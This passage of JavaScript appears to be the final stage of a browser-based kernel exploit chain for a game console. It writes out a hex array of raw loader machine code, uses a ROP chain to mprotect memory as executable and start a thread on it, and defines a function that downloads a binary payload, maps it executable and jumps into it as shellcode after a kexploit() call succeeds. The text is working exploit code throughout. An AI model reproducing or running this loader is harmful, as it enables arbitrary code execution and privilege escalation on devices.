    0x000095e8, 0xff894400, 0x000001be, 0x0095e800, 0x89440000, 0x31f631ff, 0x0062e8d2, 0x89410000,
    0x2c8b4cc6, 0x45c64124, 0x05ebc300, 0x01499848, 0xf78944c5, 0xbaee894c, 0x00001000, 0x000025e8,
    0x7fc08500, 0xff8944e7, 0x000026e8, 0xf7894400, 0x00001ee8, 0x2414ff00, 0x18c48348, 0x5e415d41,
    0x31485f41, 0xc748c3c0, 0x000003c0, 0xca894900, 0x48c3050f, 0x0006c0c7, 0x89490000, 0xc3050fca,
    0x1ec0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x00000061, 0x0fca8949, 0xc748c305, 0x000068c0,
    0xca894900, 0x48c3050f, 0x006ac0c7, 0x89490000, 0xc3050fca,
  ];
  loader_writer.set(loader_code);

  chain.sys("mprotect", payload_loader, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC);
  const pthread = new Buffer(0x10);
  sysi("mlock", payload_buffer, 0x300000);
  call_nze("pthread_create", pthread, 0, payload_loader, payload_buffer);
  log("Awaiting payload...");
};

const runPayload = (path) => {
  log(`Loading ${path}`);
  const xhr = new XMLHttpRequest();
  xhr.open("GET", path);
  xhr.responseType = "arraybuffer";
  xhr.onreadystatechange = () => {
    if (xhr.readyState !== 4) return;
    if (xhr.status === 200) {
      try {
        const padding = (4 - (xhr.response.byteLength % 4)) % 4;
        const padded_buffer = new Uint8Array(xhr.response.byteLength + padding);
        padded_buffer.set(new Uint8Array(xhr.response));
        const shellcode = new Uint32Array(padded_buffer.buffer);
        const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, 7, 0x41000, 0xffffffff, 0);
        array_from_address(payload_buffer, shellcode.length).set(shellcode);
        log(`Loaded ${xhr.response.byteLength} bytes (+${padding} padding)`);
        chain.call_void(payload_buffer);
        sysi("munmap", payload_buffer, padded_buffer.length);
      } catch (e) {
        log(`Payload error: ${e.message}`);
      }
    } else {
      log(`Payload fetch error: ${xhr.status}`);
    }
  };
  xhr.onerror = () => log("Network error");
  xhr.send();
};

kexploit().then(success => {
  if (success) runPayload(`./${getPayloadFile(version)}`);
});